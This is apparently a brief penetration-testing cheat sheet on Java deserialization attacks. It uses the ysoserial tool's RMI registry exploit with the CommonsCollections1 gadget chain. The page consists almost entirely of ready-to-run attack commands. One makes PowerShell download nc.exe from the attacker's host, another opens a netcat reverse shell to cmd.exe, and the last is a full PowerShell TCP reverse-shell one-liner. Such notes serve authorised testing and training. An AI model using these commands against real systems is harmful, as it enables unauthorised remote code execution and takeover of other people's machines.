# Java deserialization

{% embed url="https://github.com/frohoff/ysoserial" %}

## Exploitation

### Deploy payload

```
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <IP> <port> CommonsCollections1 <command or payload>
```

#### Windows - reverse shell

#### NC upload and reverse shell

```
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <IP> <port> CommonsCollections1 "powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://<local ip>/nc.exe','C:\<path>\nc.exe')\""
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <IP> <port> CommonsCollections1 "C:\<target folder>\nc.exe -nv <local ip> <local port> -e cmd.exe"
```

#### Powershell

```
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <IP> <port> CommonsCollections1 "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('<local ip>',<local port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
```
